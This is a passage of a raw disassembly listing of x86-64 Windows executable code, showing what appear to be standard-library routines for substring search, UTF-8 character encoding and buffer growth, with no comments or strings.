   1400037e0:	0f 84 5d ff ff ff    	je     0x140003743
   1400037e6:	40 b6 01             	mov    $0x1,%sil
   1400037e9:	eb 47                	jmp    0x140003832
   1400037eb:	4c 8b 7d e0          	mov    -0x20(%rbp),%r15
   1400037ef:	4f 8d 0c 1f          	lea    (%r15,%r11,1),%r9
   1400037f3:	49 39 d1             	cmp    %rdx,%r9
   1400037f6:	73 38                	jae    0x140003830
   1400037f8:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
   1400037fc:	48 89 4d 28          	mov    %rcx,0x28(%rbp)
   140003800:	48 8b 5d c0          	mov    -0x40(%rbp),%rbx
   140003804:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
   140003808:	48 89 4d b0          	mov    %rcx,-0x50(%rbp)
   14000380c:	4c 8d 63 ff          	lea    -0x1(%rbx),%r12
   140003810:	4d 8d 2c 18          	lea    (%r8,%rbx,1),%r13
   140003814:	b9 01 00 00 00       	mov    $0x1,%ecx
   140003819:	48 29 d9             	sub    %rbx,%rcx
   14000381c:	48 89 4d 20          	mov    %rcx,0x20(%rbp)
   140003820:	48 8d 0c 1f          	lea    (%rdi,%rbx,1),%rcx
   140003824:	48 ff c9             	dec    %rcx
   140003827:	48 89 4d a8          	mov    %rcx,-0x58(%rbp)
   14000382b:	48 01 df             	add    %rbx,%rdi
   14000382e:	eb 5f                	jmp    0x14000388f
   140003830:	31 f6                	xor    %esi,%esi
   140003832:	40 80 e6 01          	and    $0x1,%sil
   140003836:	89 f0                	mov    %esi,%eax
   140003838:	0f 28 75 30          	movaps 0x30(%rbp),%xmm6
   14000383c:	0f 28 7d 40          	movaps 0x40(%rbp),%xmm7
   140003840:	44 0f 28 45 50       	movaps 0x50(%rbp),%xmm8
   140003845:	44 0f 28 4d 60       	movaps 0x60(%rbp),%xmm9
   14000384a:	44 0f 28 55 70       	movaps 0x70(%rbp),%xmm10
   14000384f:	44 0f 28 9d 80 00 00 	movaps 0x80(%rbp),%xmm11
   140003856:	00 
   140003857:	44 0f 28 a5 90 00 00 	movaps 0x90(%rbp),%xmm12
   14000385e:	00 
   14000385f:	44 0f 28 ad a0 00 00 	movaps 0xa0(%rbp),%xmm13
   140003866:	00 
   140003867:	48 81 c4 38 01 00 00 	add    $0x138,%rsp
   14000386e:	5b                   	pop    %rbx
   14000386f:	5f                   	pop    %rdi
   140003870:	5e                   	pop    %rsi
   140003871:	41 5c                	pop    %r12
   140003873:	41 5d                	pop    %r13
   140003875:	41 5e                	pop    %r14
   140003877:	41 5f                	pop    %r15
   140003879:	5d                   	pop    %rbp
   14000387a:	c3                   	ret
   14000387b:	49 01 c7             	add    %rax,%r15
   14000387e:	4c 89 f9             	mov    %r15,%rcx
   140003881:	4e 8d 0c 19          	lea    (%rcx,%r11,1),%r9
   140003885:	31 f6                	xor    %esi,%esi
   140003887:	49 89 cf             	mov    %rcx,%r15
   14000388a:	49 39 d1             	cmp    %rdx,%r9
   14000388d:	73 a3                	jae    0x140003832
   14000388f:	43 0f b6 0c 08       	movzbl (%r8,%r9,1),%ecx
   140003894:	4c 8b 4d 28          	mov    0x28(%rbp),%r9
   140003898:	49 0f a3 c9          	bt     %rcx,%r9
   14000389c:	73 dd                	jae    0x14000387b
   14000389e:	45 31 c9             	xor    %r9d,%r9d
   1400038a1:	49 89 fa             	mov    %rdi,%r10
   1400038a4:	4c 89 fe             	mov    %r15,%rsi
   1400038a7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400038ae:	00 00 
   1400038b0:	4a 8d 0c 0b          	lea    (%rbx,%r9,1),%rcx
   1400038b4:	48 39 c1             	cmp    %rax,%rcx
   1400038b7:	73 27                	jae    0x1400038e0
   1400038b9:	48 8d 0c 33          	lea    (%rbx,%rsi,1),%rcx
   1400038bd:	48 39 d1             	cmp    %rdx,%rcx
   1400038c0:	0f 83 96 00 00 00    	jae    0x14000395c
   1400038c6:	45 0f b6 32          	movzbl (%r10),%r14d
   1400038ca:	48 8d 4e 01          	lea    0x1(%rsi),%rcx
   1400038ce:	49 ff c2             	inc    %r10
   1400038d1:	49 ff c1             	inc    %r9
   1400038d4:	45 3a 74 35 00       	cmp    0x0(%r13,%rsi,1),%r14b
   1400038d9:	48 89 ce             	mov    %rcx,%rsi
   1400038dc:	74 d2                	je     0x1400038b0
   1400038de:	eb a1                	jmp    0x140003881
   1400038e0:	4f 8d 14 3c          	lea    (%r12,%r15,1),%r10
   1400038e4:	48 8b 75 a8          	mov    -0x58(%rbp),%rsi
   1400038e8:	4c 8b 4d 20          	mov    0x20(%rbp),%r9
   1400038ec:	0f 1f 40 00          	nopl   0x0(%rax)
   1400038f0:	49 83 f9 01          	cmp    $0x1,%r9
   1400038f4:	0f 84 ec fe ff ff    	je     0x1400037e6
   1400038fa:	49 39 c4             	cmp    %rax,%r12
   1400038fd:	0f 83 a7 00 00 00    	jae    0x1400039aa
   140003903:	49 39 d2             	cmp    %rdx,%r10
   140003906:	0f 83 b3 00 00 00    	jae    0x1400039bf
   14000390c:	0f b6 0e             	movzbl (%rsi),%ecx
   14000390f:	49 ff c1             	inc    %r9
   140003912:	48 ff ce             	dec    %rsi
   140003915:	4d 8d 72 ff          	lea    -0x1(%r10),%r14
   140003919:	43 3a 0c 10          	cmp    (%r8,%r10,1),%cl
   14000391d:	4d 89 f2             	mov    %r14,%r10
   140003920:	74 ce                	je     0x1400038f0
   140003922:	4c 03 7d b0          	add    -0x50(%rbp),%r15
   140003926:	e9 53 ff ff ff       	jmp    0x14000387e
   14000392b:	40 80 e6 01          	and    $0x1,%sil
   14000392f:	e9 fe fe ff ff       	jmp    0x140003832
   140003934:	4c 8d 05 5d ed 06 00 	lea    0x6ed5d(%rip),%r8        # 0x140072698
   14000393b:	4c 89 f9             	mov    %r15,%rcx
   14000393e:	4c 89 f2             	mov    %r14,%rdx
   140003941:	e8 4e 7f 01 00       	call   0x14001b894
   140003946:	4c 01 c9             	add    %r9,%rcx
   140003949:	48 39 ca             	cmp    %rcx,%rdx
   14000394c:	48 0f 47 ca          	cmova  %rdx,%rcx
   140003950:	4c 8d 05 89 ed 06 00 	lea    0x6ed89(%rip),%r8        # 0x1400726e0
   140003957:	e8 38 7f 01 00       	call   0x14001b894
   14000395c:	49 01 df             	add    %rbx,%r15
   14000395f:	4c 39 fa             	cmp    %r15,%rdx
   140003962:	4c 0f 47 fa          	cmova  %rdx,%r15
   140003966:	4c 8d 05 73 ed 06 00 	lea    0x6ed73(%rip),%r8        # 0x1400726e0
   14000396d:	4c 89 f9             	mov    %r15,%rcx
   140003970:	e8 1f 7f 01 00       	call   0x14001b894
   140003975:	4c 8d 05 4c ed 06 00 	lea    0x6ed4c(%rip),%r8        # 0x1400726c8
   14000397c:	4c 89 c9             	mov    %r9,%rcx
   14000397f:	e8 10 7f 01 00       	call   0x14001b894
   140003984:	4c 8d 05 25 ed 06 00 	lea    0x6ed25(%rip),%r8        # 0x1400726b0
   14000398b:	4c 89 d1             	mov    %r10,%rcx
   14000398e:	48 89 c2             	mov    %rax,%rdx
   140003991:	e8 fe 7e 01 00       	call   0x14001b894
   140003996:	48 8d 05 9b f1 06 00 	lea    0x6f19b(%rip),%rax        # 0x140072b38
   14000399d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400039a2:	49 89 d1             	mov    %rdx,%r9
   1400039a5:	e8 d6 82 01 00       	call   0x14001bc80
   1400039aa:	49 f7 d9             	neg    %r9
   1400039ad:	4c 8d 05 fc ec 06 00 	lea    0x6ecfc(%rip),%r8        # 0x1400726b0
   1400039b4:	4c 89 c9             	mov    %r9,%rcx
   1400039b7:	48 89 c2             	mov    %rax,%rdx
   1400039ba:	e8 d5 7e 01 00       	call   0x14001b894
   1400039bf:	4c 8d 05 02 ed 06 00 	lea    0x6ed02(%rip),%r8        # 0x1400726c8
   1400039c6:	4c 89 d1             	mov    %r10,%rcx
   1400039c9:	e8 c6 7e 01 00       	call   0x14001b894
   1400039ce:	cc                   	int3
   1400039cf:	cc                   	int3
   1400039d0:	55                   	push   %rbp
   1400039d1:	48 89 e5             	mov    %rsp,%rbp
   1400039d4:	49 89 d0             	mov    %rdx,%r8
   1400039d7:	48 8b 41 08          	mov    0x8(%rcx),%rax
   1400039db:	48 8b 51 10          	mov    0x10(%rcx),%rdx
   1400039df:	48 89 c1             	mov    %rax,%rcx
   1400039e2:	5d                   	pop    %rbp
   1400039e3:	e9 d8 36 01 00       	jmp    0x1400170c0
   1400039e8:	cc                   	int3
   1400039e9:	cc                   	int3
   1400039ea:	cc                   	int3
   1400039eb:	cc                   	int3
   1400039ec:	cc                   	int3
   1400039ed:	cc                   	int3
   1400039ee:	cc                   	int3
   1400039ef:	cc                   	int3
   1400039f0:	55                   	push   %rbp
   1400039f1:	48 83 ec 20          	sub    $0x20,%rsp
   1400039f5:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   1400039fa:	e8 41 01 00 00       	call   0x140003b40
   1400039ff:	31 c0                	xor    %eax,%eax
   140003a01:	48 83 c4 20          	add    $0x20,%rsp
   140003a05:	5d                   	pop    %rbp
   140003a06:	c3                   	ret
   140003a07:	cc                   	int3
   140003a08:	cc                   	int3
   140003a09:	cc                   	int3
   140003a0a:	cc                   	int3
   140003a0b:	cc                   	int3
   140003a0c:	cc                   	int3
   140003a0d:	cc                   	int3
   140003a0e:	cc                   	int3
   140003a0f:	cc                   	int3
   140003a10:	55                   	push   %rbp
   140003a11:	41 56                	push   %r14
   140003a13:	56                   	push   %rsi
   140003a14:	57                   	push   %rdi
   140003a15:	53                   	push   %rbx
   140003a16:	48 83 ec 30          	sub    $0x30,%rsp
   140003a1a:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   140003a1f:	4c 89 c6             	mov    %r8,%rsi
   140003a22:	48 89 cf             	mov    %rcx,%rdi
   140003a25:	48 8b 01             	mov    (%rcx),%rax
   140003a28:	48 8b 59 10          	mov    0x10(%rcx),%rbx
   140003a2c:	48 29 d8             	sub    %rbx,%rax
   140003a2f:	4c 39 c0             	cmp    %r8,%rax
   140003a32:	72 23                	jb     0x140003a57
   140003a34:	48 8b 4f 08          	mov    0x8(%rdi),%rcx
   140003a38:	48 01 d9             	add    %rbx,%rcx
   140003a3b:	49 89 f0             	mov    %rsi,%r8
   140003a3e:	e8 48 6e 01 00       	call   0x14001a88b
   140003a43:	48 01 f3             	add    %rsi,%rbx
   140003a46:	48 89 5f 10          	mov    %rbx,0x10(%rdi)
   140003a4a:	31 c0                	xor    %eax,%eax
   140003a4c:	48 83 c4 30          	add    $0x30,%rsp
   140003a50:	5b                   	pop    %rbx
   140003a51:	5f                   	pop    %rdi
   140003a52:	5e                   	pop    %rsi
   140003a53:	41 5e                	pop    %r14
   140003a55:	5d                   	pop    %rbp
   140003a56:	c3                   	ret
   140003a57:	48 c7 44 24 20 01 00 	movq   $0x1,0x20(%rsp)
   140003a5e:	00 00 
   140003a60:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140003a66:	48 89 f9             	mov    %rdi,%rcx
   140003a69:	49 89 d6             	mov    %rdx,%r14
   140003a6c:	48 89 da             	mov    %rbx,%rdx
   140003a6f:	49 89 f0             	mov    %rsi,%r8
   140003a72:	e8 69 70 01 00       	call   0x14001aae0
   140003a77:	4c 89 f2             	mov    %r14,%rdx
   140003a7a:	48 8b 5f 10          	mov    0x10(%rdi),%rbx
   140003a7e:	eb b4                	jmp    0x140003a34
   140003a80:	55                   	push   %rbp
   140003a81:	56                   	push   %rsi
   140003a82:	48 83 ec 28          	sub    $0x28,%rsp
   140003a86:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   140003a8b:	48 8b 31             	mov    (%rcx),%rsi
   140003a8e:	83 7e 10 01          	cmpl   $0x1,0x10(%rsi)
   140003a92:	75 1b                	jne    0x140003aaf
   140003a94:	48 8b 4e 18          	mov    0x18(%rsi),%rcx
   140003a98:	48 8b 56 20          	mov    0x20(%rsi),%rdx
   140003a9c:	c6 01 00             	movb   $0x0,(%rcx)
   140003a9f:	48 85 d2             	test   %rdx,%rdx
   140003aa2:	74 0b                	je     0x140003aaf
   140003aa4:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140003aaa:	e8 21 e3 ff ff       	call   0x140001dd0
   140003aaf:	48 83 fe ff          	cmp    $0xffffffffffffffff,%rsi
   140003ab3:	74 20                	je     0x140003ad5
   140003ab5:	f0 48 ff 4e 08       	lock decq 0x8(%rsi)
   140003aba:	75 19                	jne    0x140003ad5
   140003abc:	ba 38 00 00 00       	mov    $0x38,%edx
   140003ac1:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140003ac7:	48 89 f1             	mov    %rsi,%rcx
   140003aca:	48 83 c4 28          	add    $0x28,%rsp
   140003ace:	5e                   	pop    %rsi
   140003acf:	5d                   	pop    %rbp
   140003ad0:	e9 fb e2 ff ff       	jmp    0x140001dd0
   140003ad5:	90                   	nop
   140003ad6:	48 83 c4 28          	add    $0x28,%rsp
   140003ada:	5e                   	pop    %rsi
   140003adb:	5d                   	pop    %rbp
   140003adc:	c3                   	ret
   140003add:	cc                   	int3
   140003ade:	cc                   	int3
   140003adf:	cc                   	int3
   140003ae0:	55                   	push   %rbp
   140003ae1:	56                   	push   %rsi
   140003ae2:	48 83 ec 28          	sub    $0x28,%rsp
   140003ae6:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   140003aeb:	48 8b 31             	mov    (%rcx),%rsi
   140003aee:	48 8b 56 18          	mov    0x18(%rsi),%rdx
   140003af2:	48 85 d2             	test   %rdx,%rdx
   140003af5:	74 0f                	je     0x140003b06
   140003af7:	48 8b 4e 20          	mov    0x20(%rsi),%rcx
   140003afb:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140003b01:	e8 ca e2 ff ff       	call   0x140001dd0
   140003b06:	48 83 fe ff          	cmp    $0xffffffffffffffff,%rsi
   140003b0a:	74 20                	je     0x140003b2c
   140003b0c:	f0 48 ff 4e 08       	lock decq 0x8(%rsi)
   140003b11:	75 19                	jne    0x140003b2c
   140003b13:	ba 30 00 00 00       	mov    $0x30,%edx
   140003b18:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140003b1e:	48 89 f1             	mov    %rsi,%rcx
   140003b21:	48 83 c4 28          	add    $0x28,%rsp
   140003b25:	5e                   	pop    %rsi
   140003b26:	5d                   	pop    %rbp
   140003b27:	e9 a4 e2 ff ff       	jmp    0x140001dd0
   140003b2c:	90                   	nop
   140003b2d:	48 83 c4 28          	add    $0x28,%rsp
   140003b31:	5e                   	pop    %rsi
   140003b32:	5d                   	pop    %rbp
   140003b33:	c3                   	ret
   140003b34:	cc                   	int3
   140003b35:	cc                   	int3
   140003b36:	cc                   	int3
   140003b37:	cc                   	int3
   140003b38:	cc                   	int3
   140003b39:	cc                   	int3
   140003b3a:	cc                   	int3
   140003b3b:	cc                   	int3
   140003b3c:	cc                   	int3
   140003b3d:	cc                   	int3
   140003b3e:	cc                   	int3
   140003b3f:	cc                   	int3
   140003b40:	55                   	push   %rbp
   140003b41:	56                   	push   %rsi
   140003b42:	57                   	push   %rdi
   140003b43:	53                   	push   %rbx
   140003b44:	48 83 ec 38          	sub    $0x38,%rsp
   140003b48:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   140003b4d:	48 89 ce             	mov    %rcx,%rsi
   140003b50:	81 fa 80 00 00 00    	cmp    $0x80,%edx
   140003b56:	73 28                	jae    0x140003b80
   140003b58:	48 8b 7e 10          	mov    0x10(%rsi),%rdi
   140003b5c:	48 3b 3e             	cmp    (%rsi),%rdi
   140003b5f:	75 0c                	jne    0x140003b6d
   140003b61:	48 89 f1             	mov    %rsi,%rcx
   140003b64:	89 d3                	mov    %edx,%ebx
   140003b66:	e8 75 01 00 00       	call   0x140003ce0
   140003b6b:	89 da                	mov    %ebx,%edx
   140003b6d:	48 8b 46 08          	mov    0x8(%rsi),%rax
   140003b71:	88 14 38             	mov    %dl,(%rax,%rdi,1)
   140003b74:	48 ff c7             	inc    %rdi
   140003b77:	48 89 7e 10          	mov    %rdi,0x10(%rsi)
   140003b7b:	e9 ac 00 00 00       	jmp    0x140003c2c
   140003b80:	c7 45 04 00 00 00 00 	movl   $0x0,0x4(%rbp)
   140003b87:	89 d0                	mov    %edx,%eax
   140003b89:	81 fa 00 08 00 00    	cmp    $0x800,%edx
   140003b8f:	73 18                	jae    0x140003ba9
   140003b91:	c1 e8 06             	shr    $0x6,%eax
   140003b94:	0c c0                	or     $0xc0,%al
   140003b96:	88 45 04             	mov    %al,0x4(%rbp)
   140003b99:	80 e2 3f             	and    $0x3f,%dl
   140003b9c:	80 ca 80             	or     $0x80,%dl
   140003b9f:	88 55 05             	mov    %dl,0x5(%rbp)
   140003ba2:	bf 02 00 00 00       	mov    $0x2,%edi
   140003ba7:	eb 5a                	jmp    0x140003c03
   140003ba9:	81 fa 00 00 01 00    	cmp    $0x10000,%edx
   140003baf:	73 24                	jae    0x140003bd5
   140003bb1:	c1 e8 0c             	shr    $0xc,%eax
   140003bb4:	0c e0                	or     $0xe0,%al
   140003bb6:	88 45 04             	mov    %al,0x4(%rbp)
   140003bb9:	89 d0                	mov    %edx,%eax
   140003bbb:	c1 e8 06             	shr    $0x6,%eax
   140003bbe:	24 3f                	and    $0x3f,%al
   140003bc0:	0c 80                	or     $0x80,%al
   140003bc2:	88 45 05             	mov    %al,0x5(%rbp)
   140003bc5:	80 e2 3f             	and    $0x3f,%dl
   140003bc8:	80 ca 80             	or     $0x80,%dl
   140003bcb:	88 55 06             	mov    %dl,0x6(%rbp)
   140003bce:	bf 03 00 00 00       	mov    $0x3,%edi
   140003bd3:	eb 2e                	jmp    0x140003c03
   140003bd5:	c1 e8 12             	shr    $0x12,%eax
   140003bd8:	0c f0                	or     $0xf0,%al
   140003bda:	88 45 04             	mov    %al,0x4(%rbp)
   140003bdd:	89 d0                	mov    %edx,%eax
   140003bdf:	c1 e8 0c             	shr    $0xc,%eax
   140003be2:	24 3f                	and    $0x3f,%al
   140003be4:	0c 80                	or     $0x80,%al
   140003be6:	88 45 05             	mov    %al,0x5(%rbp)
   140003be9:	89 d0                	mov    %edx,%eax
   140003beb:	c1 e8 06             	shr    $0x6,%eax
   140003bee:	24 3f                	and    $0x3f,%al
   140003bf0:	0c 80                	or     $0x80,%al
   140003bf2:	88 45 06             	mov    %al,0x6(%rbp)
   140003bf5:	80 e2 3f             	and    $0x3f,%dl
   140003bf8:	80 ca 80             	or     $0x80,%dl
   140003bfb:	88 55 07             	mov    %dl,0x7(%rbp)
   140003bfe:	bf 04 00 00 00       	mov    $0x4,%edi
   140003c03:	48 8b 06             	mov    (%rsi),%rax
   140003c06:	48 8b 5e 10          	mov    0x10(%rsi),%rbx
   140003c0a:	48 29 d8             	sub    %rbx,%rax
   140003c0d:	48 39 f8             	cmp    %rdi,%rax
   140003c10:	72 23                	jb     0x140003c35
   140003c12:	48 8b 4e 08          	mov    0x8(%rsi),%rcx
   140003c16:	48 01 d9             	add    %rbx,%rcx
   140003c19:	48 8d 55 04          	lea    0x4(%rbp),%rdx
   140003c1d:	49 89 f8             	mov    %rdi,%r8
   140003c20:	e8 66 6c 01 00       	call   0x14001a88b
   140003c25:	48 01 fb             	add    %rdi,%rbx
   140003c28:	48 89 5e 10          	mov    %rbx,0x10(%rsi)
   140003c2c:	48 83 c4 38          	add    $0x38,%rsp
   140003c30:	5b                   	pop    %rbx
   140003c31:	5f                   	pop    %rdi
   140003c32:	5e                   	pop    %rsi
   140003c33:	5d                   	pop    %rbp
   140003c34:	c3                   	ret
   140003c35:	48 c7 44 24 20 01 00 	movq   $0x1,0x20(%rsp)
   140003c3c:	00 00 
   140003c3e:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   140003c44:	48 89 f1             	mov    %rsi,%rcx
   140003c47:	48 89 da             	mov    %rbx,%rdx
   140003c4a:	49 89 f8             	mov    %rdi,%r8
   140003c4d:	e8 8e 6e 01 00       	call   0x14001aae0
   140003c52:	48 8b 5e 10          	mov    0x10(%rsi),%rbx
   140003c56:	eb ba                	jmp    0x140003c12
   140003c58:	cc                   	int3
   140003c59:	cc                   	int3
   140003c5a:	cc                   	int3
   140003c5b:	cc                   	int3
   140003c5c:	cc                   	int3
   140003c5d:	cc                   	int3
   140003c5e:	cc                   	int3
   140003c5f:	cc                   	int3
   140003c60:	55                   	push   %rbp
   140003c61:	56                   	push   %rsi
   140003c62:	57                   	push   %rdi
   140003c63:	53                   	push   %rbx
   140003c64:	48 83 ec 28          	sub    $0x28,%rsp
   140003c68:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   140003c6d:	4c 89 c6             	mov    %r8,%rsi
   140003c70:	48 89 d3             	mov    %rdx,%rbx
   140003c73:	48 89 cf             	mov    %rcx,%rdi
   140003c76:	49 83 79 08 00       	cmpq   $0x0,0x8(%r9)
   140003c7b:	74 19                	je     0x140003c96
   140003c7d:	49 8b 51 10          	mov    0x10(%r9),%rdx
   140003c81:	48 85 d2             	test   %rdx,%rdx
   140003c84:	74 10                	je     0x140003c96
   140003c86:	49 8b 09             	mov    (%r9),%rcx
   140003c89:	49 89 d8             	mov    %rbx,%r8
   140003c8c:	49 89 f1             	mov    %rsi,%r9
   140003c8f:	e8 4c e1 ff ff       	call   0x140001de0
   140003c94:	eb 1c                	jmp    0x140003cb2
   140003c96:	48 85 f6             	test   %rsi,%rsi
   140003c99:	74 14                	je     0x140003caf
   140003c9b:	0f b6 05 4f 84 07 00 	movzbl 0x7844f(%rip),%eax        # 0x14007c0f1
   140003ca2:	48 89 f1             	mov    %rsi,%rcx
   140003ca5:	48 89 da             	mov    %rbx,%rdx
   140003ca8:	e8 13 e1 ff ff       	call   0x140001dc0
   140003cad:	eb 03                	jmp    0x140003cb2
   140003caf:	48 89 d8             	mov    %rbx,%rax
   140003cb2:	31 c9                	xor    %ecx,%ecx
   140003cb4:	48 85 c0             	test   %rax,%rax
   140003cb7:	48 0f 45 d8          	cmovne %rax,%rbx
   140003cbb:	0f 94 c1             	sete   %cl
   140003cbe:	48 89 5f 08          	mov    %rbx,0x8(%rdi)
   140003cc2:	48 89 77 10          	mov    %rsi,0x10(%rdi)
   140003cc6:	48 89 0f             	mov    %rcx,(%rdi)
   140003cc9:	48 83 c4 28          	add    $0x28,%rsp
   140003ccd:	5b                   	pop    %rbx
   140003cce:	5f                   	pop    %rdi
   140003ccf:	5e                   	pop    %rsi
   140003cd0:	5d                   	pop    %rbp
   140003cd1:	c3                   	ret
   140003cd2:	cc                   	int3
   140003cd3:	cc                   	int3
   140003cd4:	cc                   	int3
   140003cd5:	cc                   	int3
   140003cd6:	cc                   	int3
   140003cd7:	cc                   	int3
   140003cd8:	cc                   	int3
   140003cd9:	cc                   	int3
   140003cda:	cc                   	int3
   140003cdb:	cc                   	int3
   140003cdc:	cc                   	int3
   140003cdd:	cc                   	int3
   140003cde:	cc                   	int3
   140003cdf:	cc                   	int3
   140003ce0:	55                   	push   %rbp
   140003ce1:	56                   	push   %rsi
   140003ce2:	57                   	push   %rdi
   140003ce3:	48 83 ec 50          	sub    $0x50,%rsp
   140003ce7:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   140003cec:	48 8b 01             	mov    (%rcx),%rax
   140003cef:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140003cf3:	74 70                	je     0x140003d65
   140003cf5:	48 89 ce             	mov    %rcx,%rsi
   140003cf8:	48 8d 48 01          	lea    0x1(%rax),%rcx
   140003cfc:	48 8d 14 00          	lea    (%rax,%rax,1),%rdx
   140003d00:	48 39 ca             	cmp    %rcx,%rdx
   140003d03:	48 0f 47 ca          	cmova  %rdx,%rcx
   140003d07:	48 83 f9 09          	cmp    $0x9,%rcx
   140003d0b:	bf 08 00 00 00       	mov    $0x8,%edi
   140003d10:	48 0f 43 f9          	cmovae %rcx,%rdi
   140003d14:	48 85 ff             	test   %rdi,%rdi
   140003d17:	78 4c                	js     0x140003d65
   140003d19:	48 85 c0             	test   %rax,%rax
   140003d1c:	74 13                	je     0x140003d31
   140003d1e:	48 8b 4e 08          	mov    0x8(%rsi),%rcx
   140003d22:	48 89 4d d0          	mov    %rcx,-0x30(%rbp)
   140003d26:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140003d2a:	b8 01 00 00 00       	mov    $0x1,%eax
   140003d2f:	eb 02                	jmp    0x140003d33
   140003d31:	31 c0                	xor    %eax,%eax
   140003d33:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   140003d37:	48 8d 4d e8          	lea    -0x18(%rbp),%rcx
   140003d3b:	4c 8d 4d d0          	lea    -0x30(%rbp),%r9
   140003d3f:	ba 01 00 00 00       	mov    $0x1,%edx
   140003d44:	49 89 f8             	mov    %rdi,%r8
   140003d47:	e8 14 ff ff ff       	call   0x140003c60
   140003d4c:	83 7d e8 01          	cmpl   $0x1,-0x18(%rbp)
   140003d50:	74 1a                	je     0x140003d6c
   140003d52:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140003d56:	48 89 46 08          	mov    %rax,0x8(%rsi)
   140003d5a:	48 89 3e             	mov    %rdi,(%rsi)
   140003d5d:	48 83 c4 50          	add    $0x50,%rsp
   140003d61:	5f                   	pop    %rdi
   140003d62:	5e                   	pop    %rsi
   140003d63:	5d                   	pop    %rbp
   140003d64:	c3                   	ret
   140003d65:	31 c9                	xor    %ecx,%ecx
   140003d67:	e8 d9 78 01 00       	call   0x14001b645
   140003d6c:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140003d70:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
   140003d74:	e8 cc 78 01 00       	call   0x14001b645
   140003d79:	cc                   	int3
   140003d7a:	cc                   	int3
   140003d7b:	cc                   	int3
   140003d7c:	cc                   	int3
   140003d7d:	cc                   	int3
   140003d7e:	cc                   	int3
   140003d7f:	cc                   	int3
   140003d80:	55                   	push   %rbp
   140003d81:	56                   	push   %rsi
   140003d82:	57                   	push   %rdi
   140003d83:	48 83 ec 50          	sub    $0x50,%rsp
   140003d87:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   140003d8c:	48 8b 01             	mov    (%rcx),%rax
   140003d8f:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140003d93:	0f 84 8a 00 00 00    	je     0x140003e23
   140003d99:	48 89 ce             	mov    %rcx,%rsi
   140003d9c:	48 8d 50 01          	lea    0x1(%rax),%rdx
   140003da0:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
   140003da4:	48 39 d1             	cmp    %rdx,%rcx
   140003da7:	48 0f 47 d1          	cmova  %rcx,%rdx
   140003dab:	48 83 fa 05          	cmp    $0x5,%rdx
   140003daf:	bf 04 00 00 00       	mov    $0x4,%edi
   140003db4:	48 0f 43 fa          	cmovae %rdx,%rdi
   140003db8:	31 c9                	xor    %ecx,%ecx
   140003dba:	48 c1 ea 3c          	shr    $0x3c,%rdx
   140003dbe:	75 77                	jne    0x140003e37
   140003dc0:	49 89 f8             	mov    %rdi,%r8
   140003dc3:	49 c1 e0 04          	shl    $0x4,%r8
   140003dc7:	49 b9 f8 ff ff ff ff 	movabs $0x7ffffffffffffff8,%r9
   140003dce:	ff ff 7f 
   140003dd1:	4d 39 c8             	cmp    %r9,%r8
   140003dd4:	77 5c                	ja     0x140003e32
   140003dd6:	48 85 c0             	test   %rax,%rax
   140003dd9:	74 17                	je     0x140003df2
   140003ddb:	48 8b 4e 08          	mov    0x8(%rsi),%rcx
   140003ddf:	48 c1 e0 04          	shl    $0x4,%rax
   140003de3:	48 89 4d d0          	mov    %rcx,-0x30(%rbp)
   140003de7:	48 89 45 e0          	mov    %rax,-0x20(%rbp)
   140003deb:	b8 08 00 00 00       	mov    $0x8,%eax
   140003df0:	eb 02                	jmp    0x140003df4
   140003df2:	31 c0                	xor    %eax,%eax
   140003df4:	48 89 45 d8          	mov    %rax,-0x28(%rbp)
   140003df8:	48 8d 4d e8          	lea    -0x18(%rbp),%rcx
   140003dfc:	4c 8d 4d d0          	lea    -0x30(%rbp),%r9
   140003e00:	ba 08 00 00 00       	mov    $0x8,%edx
   140003e05:	e8 56 fe ff ff       	call   0x140003c60
   140003e0a:	83 7d e8 01          	cmpl   $0x1,-0x18(%rbp)
   140003e0e:	74 1a                	je     0x140003e2a
   140003e10:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
   140003e14:	48 89 46 08          	mov    %rax,0x8(%rsi)
   140003e18:	48 89 3e             	mov    %rdi,(%rsi)
   140003e1b:	48 83 c4 50          	add    $0x50,%rsp
   140003e1f:	5f                   	pop    %rdi
   140003e20:	5e                   	pop    %rsi
   140003e21:	5d                   	pop    %rbp
   140003e22:	c3                   	ret
   140003e23:	31 c9                	xor    %ecx,%ecx
   140003e25:	e8 1b 78 01 00       	call   0x14001b645
   140003e2a:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
   140003e2e:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
   140003e32:	e8 0e 78 01 00       	call   0x14001b645
   140003e37:	e8 09 78 01 00       	call   0x14001b645
   140003e3c:	cc                   	int3
   140003e3d:	cc                   	int3
   140003e3e:	cc                   	int3
   140003e3f:	cc                   	int3
   140003e40:	55                   	push   %rbp
   140003e41:	56                   	push   %rsi
   140003e42:	57                   	push   %rdi
   140003e43:	48 83 ec 50          	sub    $0x50,%rsp
   140003e47:	48 8d 6c 24 50       	lea    0x50(%rsp),%rbp
   140003e4c:	48 8b 01             	mov    (%rcx),%rax
   140003e4f:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140003e53:	0f 84 82 00 00 00    	je     0x140003edb
   140003e59:	48 89 ce             	mov    %rcx,%rsi
